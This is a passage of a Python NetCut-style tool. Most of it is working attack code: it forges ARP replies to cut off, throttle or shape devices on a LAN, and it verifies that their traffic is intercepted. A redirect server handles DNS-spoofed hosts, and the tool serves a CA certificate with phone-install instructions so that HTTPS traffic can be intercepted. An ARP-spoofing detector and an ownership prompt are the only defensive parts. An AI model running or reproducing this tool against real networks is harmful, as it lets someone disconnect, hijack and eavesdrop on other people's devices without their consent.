            cut.thread = threading.Thread(target=self._loop, args=(cut,), daemon=True)
            self.cuts[ip] = cut
            self._by_mac[target_mac] = cut
            cut.thread.start()
            self._ensure_sniffer()
            self._ensure_v6()
            return cut

    def set_mode(self, ip, mode, throttle="medium"):
        c = self.cuts.get(str(ip))
        if not c:
            return False
        if mode == "throttle":
            c.throttle = THROTTLE.get(throttle, 0.65) if isinstance(throttle, str) else float(throttle)
        if mode == "shape":
            if c.dbucket is None:
                c.dbucket, c.ubucket = Bucket(c.down_mbps), Bucket(c.up_mbps)
            self._shaped[c.ip] = c
        else:
            self._shaped.pop(c.ip, None)
        c.mode, c.level = mode, 1
        return True

    def set_shape(self, ip, down_mbps=None, up_mbps=None):
        """Change (or set) the Mbps limits live. Switches the cut into shape mode if needed."""
        c = self.cuts.get(str(ip))
        if not c:
            return None
        if down_mbps is not None:
            c.down_mbps = max(0.0, float(down_mbps))
        if up_mbps is not None:
            c.up_mbps = max(0.0, float(up_mbps))
        if c.dbucket is None:
            c.dbucket, c.ubucket = Bucket(c.down_mbps), Bucket(c.up_mbps)
        else:
            c.dbucket.set(c.down_mbps); c.ubucket.set(c.up_mbps)
        c.mode = "shape"
        self._shaped[c.ip] = c
        return {"down_mbps": c.down_mbps, "up_mbps": c.up_mbps}

    def sample_rates(self):
        """Refresh each shaped cut's measured Mbps from byte counters. Call from status/snapshot."""
        now = time.monotonic()
        for c in self.cuts.values():
            if c.mode != "shape":
                continue
            dt = now - c._rate_ts
            if dt >= 0.4:
                c.down_rate = (c.down_bytes - c._rate_d) * 8 / dt / 1e6
                c.up_rate = (c.up_bytes - c._rate_u) * 8 / dt / 1e6
                c._rate_ts, c._rate_d, c._rate_u = now, c.down_bytes, c.up_bytes

    def set_level(self, ip, level):
        c = self.cuts.get(str(ip))
        if c:
            c.auto = False
            c.level = max(1, min(MAX_LEVEL, int(level)))
            c.repoison.set()
            return c.level
        return None

    def verify(self, ip, window=4.0):
        """Actively confirm the cut: watch for ~window seconds and report whether we're catching
        the victim's internet traffic and whether it's trying to escape. Returns a dict."""
        c = self.cuts.get(str(ip))
        if not c:
            return None
        base_i, base_e = c.intercepted, c.escapes
        t0 = time.time()
        while time.time() - t0 < window and not c.stop.is_set():
            time.sleep(0.4)
        gained = c.intercepted - base_i
        esc = c.escapes - base_e
        recent = (time.time() - c.last_intercept) < window + 2 if c.last_intercept else False
        return {"intercepted_now": gained, "intercepted_total": c.intercepted, "escapes_now": esc,
                "level": c.level, "mode": c.mode, "intercepting": gained > 0 or recent}

    def stop_cut(self, target_ip, do_heal=True):
        ip = str(ipaddress.ip_address(target_ip))
        with self._lock:
            cut = self.cuts.pop(ip, None)
            if cut:
                self._by_mac.pop(cut.mac, None)
                self._shaped.pop(ip, None)
        if not cut:
            return False
        cut.stop.set()
        cut.repoison.set()
        if cut.thread:
            cut.thread.join(timeout=2)
        if do_heal:
            heal(self.env, cut.ip, cut.mac)
        self._stop_sniffer_if_idle()
        return True

    def stop_all(self, do_heal=True):
        for ip in list(self.cuts):
            self.stop_cut(ip, do_heal=do_heal)

    def stop_services(self):
        """Stop the redirect + TLS servers (call on shutdown). Rules are kept in memory."""
        if self._redirect:
            self._redirect.stop()
            self._redirect = None
        if self._tls:
            self._tls.stop()
            self._tls = None
        self.https_intercept = False

    def is_cut(self, ip):
        return str(ip) in self.cuts

    def get(self, ip):
        return self.cuts.get(str(ip))

    def status(self):
        with self._lock:
            return [(c.ip, c.mac, int(time.time() - c.started), c.sent, c.mode, c.level,
                     c.intercepted, c.escapes) for c in self.cuts.values()]


# ----------------------------------------------------------------------------- protection

class Protector:
    """Defends THIS machine: pins a static ARP entry for the gateway (so our cache can't be
    poisoned) and sniffs for ARP spoofing aimed at us or anyone, naming the attacker."""

    def __init__(self, env: Env, on_alert=None):
        self.env = env
        self.on_alert = on_alert or (lambda msg: print(col("\n[!] " + msg, "red", "b")))
        self._sniff_stop = threading.Event()
        self._sniffer: threading.Thread | None = None
        self._static = False
        self._seen: dict[str, str] = {}
        self._vendors = None
        try:
            import net_tree
            self._vendors = net_tree.Vendors()
        except Exception:
            pass

    # --- static ARP entry for the gateway (strongest Windows defence) ---
    def pin_gateway(self):
        if not (self.env.gateway_ip and self.env.gateway_mac):
            return False, "gateway MAC unknown"
        if not IS_WIN:
            return False, "static-ARP pinning implemented for Windows only"
        idx = iface_index(self.env.iface) or "0"
        mac = self.env.gateway_mac.replace(":", "-").lower()
        base = ["netsh", "interface", "ipv4"]
        for verb in ("add", "set"):
            r = subprocess.run(base + [verb, "neighbors", idx, self.env.gateway_ip, mac],
                               capture_output=True, text=True)
            if r.returncode == 0:
                self._static = True
                return True, f"gateway {self.env.gateway_ip} pinned to {self.env.gateway_mac} (static)"
        return False, (r.stderr or r.stdout or "netsh failed").strip()

    def unpin_gateway(self):
        if not (self._static and IS_WIN):
            return
        idx = iface_index(self.env.iface) or "0"
        subprocess.run(["netsh", "interface", "ipv4", "delete", "neighbors", idx, self.env.gateway_ip],
                       capture_output=True, text=True)
        self._static = False

    # --- live ARP-spoofing detector ---
    def _vendor(self, mac):
        if not self._vendors:
            return ""
        try:
            return self._vendors.lookup(mac)
        except Exception:
            return ""

    def _on_packet(self, pkt):
        if not pkt.haslayer(ARP) or pkt[ARP].op != 2:
            return
        psrc = pkt[ARP].psrc
        hwsrc = norm_mac(pkt[ARP].hwsrc)
        if not hwsrc:
            return
        # someone claims to be the gateway with a MAC that isn't the real one
        if psrc == self.env.gateway_ip and self.env.gateway_mac and hwsrc != self.env.gateway_mac:
            if self._seen.get(psrc) != hwsrc:
                self._seen[psrc] = hwsrc
                v = self._vendor(hwsrc)
                self.on_alert(f"ARP SPOOFING: someone claims to be the gateway {psrc} "
                              f"from {hwsrc} {('(' + v + ')') if v else ''} - a NetCut-style attack. "
                              f"Your static ARP entry is protecting you.")
        # someone claims to be US
        elif psrc == self.env.my_ip and hwsrc != self.env.my_mac:
            v = self._vendor(hwsrc)
            self.on_alert(f"Someone is impersonating your IP {psrc} from {hwsrc} {('(' + v + ')') if v else ''}")

    def start_watch(self):
        if not SCAPY_OK or self._sniffer:
            return
        self._sniff_stop.clear()

        def run():
            try:
                sniff(filter="arp", iface=self.env.iface, prn=self._on_packet, store=False,
                      stop_filter=lambda p: self._sniff_stop.is_set())
            except Exception as e:
                self.on_alert(f"ARP watcher stopped: {e}")

        self._sniffer = threading.Thread(target=run, daemon=True)
        self._sniffer.start()

    def stop_watch(self):
        self._sniff_stop.set()
        if self._sniffer:
            self._sniffer.join(timeout=2)
            self._sniffer = None

    def shutdown(self):
        self.stop_watch()
        self.unpin_gateway()


# ----------------------------------------------------------------------------- preflight

def preflight(env: Env):
    """Human-readable readiness check printed before any cut."""
    print(col("\nNetCut engine - environment check", "c", "b"))
    print(f"  This PC      : {env.my_ip}  ({env.my_mac or 'MAC unknown'})")
    print(f"  Gateway      : {env.gateway_ip}  ({env.gateway_mac or col('MAC unknown - run as admin', 'y')})")
    print(f"  Network      : {env.network}")
    print(f"  Interface    : {getattr(env.iface, 'name', env.iface)}")
    ok = True
    if not SCAPY_OK:
        print(col("  scapy/Npcap  : MISSING", "red")); ok = False
    else:
        print(col("  scapy/Npcap  : ready", "g"))
    if not is_admin():
        print(col("  Admin rights : NO - sending ARP frames will fail. Restart as Administrator.", "red")); ok = False
    else:
        print(col("  Admin rights : yes", "g"))
    fwd = ip_forwarding_on()
    if fwd:
        print(col("  IP forwarding: ON - a cut would become a silent MITM. Turn it OFF for a clean cut.", "y"))
    elif fwd is False:
        print(col("  IP forwarding: off (good - cuts are a clean disconnect)", "g"))
    if env.gateway_ll:
        print(col(f"  IPv6 router  : {env.gateway_ll} (cuts will kill IPv6 too)", "g"))
    else:
        print(col("  IPv6 router  : not detected yet (found on first cut, if any)", "dim"))
    if not env.gateway_mac:
        ok = False
    return ok


# ----------------------------------------------------------------------------- redirect server

class RedirectServer:
    """Tiny HTTP server on port 80. A device whose DNS was spoofed to our IP lands here, and we
    send it an HTTP 302 to the real target URL (so http://tung.co.il -> https://google.com).
    HTTPS requests can't be redirected this way (no certificate for the faked host)."""

    def __init__(self, bind_ip):
        self.bind_ip = bind_ip
        self.rules = {}           # host(lower) -> rule dict {kind:redirect|serve, url, html}
        self.ca_pem = None        # the CA cert bytes, served for the phone to install
        self.httpd = None
        self.thread = None

    def _lookup(self, host):
        host = (host or "").split(":")[0].lower()
        return self.rules.get(host) or next(
            (r for d, r in self.rules.items() if host.endswith("." + d)), None)

    def start(self):
        owner = self

        class H(BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def _send(self, code, body, ctype):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(body)

            def _handle(self):
                path = self.path.split("?", 1)[0]
                # CA download + install help, reachable at http://<pc-ip>/netcut-ca.crt
                if owner.ca_pem and path in ("/netcut-ca.crt", "/netcut-ca.pem"):
                    return self._send(200, owner.ca_pem, "application/x-x509-ca-cert")
                if owner.ca_pem and path in ("/netcut", "/netcut-ca"):
                    page = ("<meta name=viewport content='width=device-width'>"
                            "<h2>Install the NetCut certificate</h2>"
                            "<p><a href='/netcut-ca.crt'><b>Tap here to download netcut-ca.crt</b></a></p>"
                            "<p>iPhone: Settings &rsaquo; Profile Downloaded &rsaquo; Install, then "
                            "Settings &rsaquo; General &rsaquo; About &rsaquo; Certificate Trust Settings &rsaquo; "
                            "turn ON for NetCut.<br>Android: Settings &rsaquo; Security &rsaquo; "
                            "Encryption &amp; credentials &rsaquo; Install a certificate &rsaquo; CA certificate.</p>")
                    return self._send(200, page.encode("utf-8"), "text/html; charset=utf-8")
                rule = owner._lookup(self.headers.get("Host", ""))
                if rule and rule.get("kind") == "serve":
                    body = (rule.get("html") or "").encode("utf-8", "replace")
                    self.send_response(200)
                    self.send_header("Content-Type", "text/html; charset=utf-8")
                    self.send_header("Content-Length", str(len(body)))
                    self.end_headers()
                    if self.command != "HEAD":
                        self.wfile.write(body)
                    return
                if rule and rule.get("url"):
                    self.send_response(302)
                    self.send_header("Location", rule["url"])
                else:
                    self.send_response(404)
                self.send_header("Content-Length", "0")
                self.end_headers()

            do_GET = do_HEAD = do_POST = _handle

        try:
            self.httpd = ThreadingHTTPServer(("0.0.0.0", 80), H)
        except Exception:
            self.httpd = None
            return False
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        return True

    def stop(self):
        if self.httpd:
            try:
                self.httpd.shutdown()
            except Exception:
                pass
            self.httpd = None


# ----------------------------------------------------------------------------- standalone CLI

def _confirm_own_network(net):
    print(col(f"\nYou are about to send forged ARP on {net}.", "y", "b"))
    print("Only do this on a network you own or manage. On someone else's network this is illegal.")
    return input(col("Type 'yes' to confirm this is your network: ", "b")).strip().lower() == "yes"


def main():
    ap = argparse.ArgumentParser(description="netcut.py - cut/resume/protect on your own LAN (ARP)")
    sub = ap.add_subparsers(dest="cmd", required=True)
    c = sub.add_parser("cut", help="cut one or more devices off the internet")
    c.add_argument("targets", nargs="+", help="IP(s) to cut, or 'all'")
    c.add_argument("-t", "--time", type=int, default=0, help="seconds then auto-resume (0 = until Ctrl-C)")
    c.add_argument("--throttle", choices=list(THROTTLE), help="weak-wifi mode instead of full cut")
    c.add_argument("--no-auto", action="store_true", help="do not auto-escalate if the device stays online")
    sub.add_parser("protect", help="pin the gateway + watch for ARP spoofing")
    sub.add_parser("check", help="environment readiness check only")
    args = ap.parse_args()

    if not SCAPY_OK:
        print(INSTALL_HELP)
        print(col(f"\nimport error: {SCAPY_ERR}", "dim"))
        sys.exit(1)

    env = Env.detect()
    ready = preflight(env)
    if args.cmd == "check":
        return
    if not ready:
        print(col("\nNot ready - fix the items above first.", "red"))
        sys.exit(1)
    if not _confirm_own_network(env.network):
        print("Aborted.")
        return

    if args.cmd == "protect":
        prot = Protector(env)
        ok, msg = prot.pin_gateway()
        print(col(("  " + msg) if ok else ("  could not pin gateway: " + msg), "g" if ok else "y"))
        prot.start_watch()
        print(col("Protection active. Watching for ARP spoofing. Ctrl-C to stop.", "g", "b"))
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            prot.shutdown()
            print(col("\nProtection off, static ARP entry removed.", "dim"))
        return

    # cut
    mgr = CutManager(env)
    if args.targets == ["all"]:
        import net_tree
        print("Discovering devices to cut ...")
        nm = net_tree.NetMap()
        nm.scan(env.network)
        targets = [d.ip for d in nm.devices.values() if d.ip not in (env.my_ip, env.gateway_ip)]
    else:
        targets = args.targets
    mode = "throttle" if args.throttle else "full"
    for ip in targets:
        try:
            cut = mgr.start(ip, "", mode=mode, throttle=args.throttle or "medium", auto=not args.no_auto)
            label = f"WEAK-WIFI ({args.throttle})" if mode == "throttle" else "CUT"
            print(col(f"  {label}  {ip}  ({cut.mac})", "red"))
        except Exception as e:
            print(col(f"  skip {ip}: {e}", "y"))
    if not mgr.cuts:
        print("Nothing to cut.")
        return
    print(col(f"\n{len(mgr.cuts)} device(s) hit. ", "red", "b") +
          (f"Auto-resume in {args.time}s." if args.time else "Ctrl-C to resume and exit."))
    print(col("Verifying (watching whether their traffic is now being intercepted) ...", "c"))
    for ip in list(mgr.cuts):
        v = mgr.verify(ip, window=4)
        if v and v["intercepting"]:
            print(col(f"  {ip}: cut CONFIRMED - intercepting its traffic "
                      f"({v['intercepted_total']} frames, level {v['level']}).", "g"))
        else:
            print(col(f"  {ip}: no traffic captured yet - device may be idle, or still connected. "
                      f"Auto-escalation is {'on' if not args.no_auto else 'off'}.", "y"))
    try:
        if args.time:
            time.sleep(args.time)
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        print(col("\nResuming all devices ...", "g"))
        mgr.stop_all(do_heal=True)
        print(col("Done - everyone restored.", "g", "b"))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.")
